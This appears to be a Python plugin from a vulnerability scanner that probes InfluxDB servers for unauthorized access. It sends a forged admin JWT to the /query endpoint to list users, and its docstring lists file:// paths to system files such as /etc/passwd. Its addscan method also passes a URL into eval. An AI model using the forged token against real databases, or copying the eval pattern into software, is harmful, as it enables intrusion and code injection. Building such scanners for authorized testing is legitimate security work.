#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
influxdb是一款著名的时序数据库
    influxdb扫描类: 
        influxdb 未授权访问
            暂无编号
                Payload: https://vulhub.org/#/environments/influxdb/unacc/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from lib.tool import head
from payloads.Influxdb.unauth import unauth_scan

class Influxdb():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'influxdb'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.influxdb_unauthorized_payloads = [
            {
                'path': 'query',
                'data': 'db=sample&q=show+users',
                'headers': head.merge(self.headers, {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo2NjY2NjY2NjY2fQ.XVfnw6S7uq4i9_RraPztULowgOlKLkX60MYcXWZbot0'})
            },
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.influxdb_unauthorized_scan, url=url)
        ]

Influxdb.influxdb_unauthorized_scan = unauth_scan

influxdb = Influxdb()
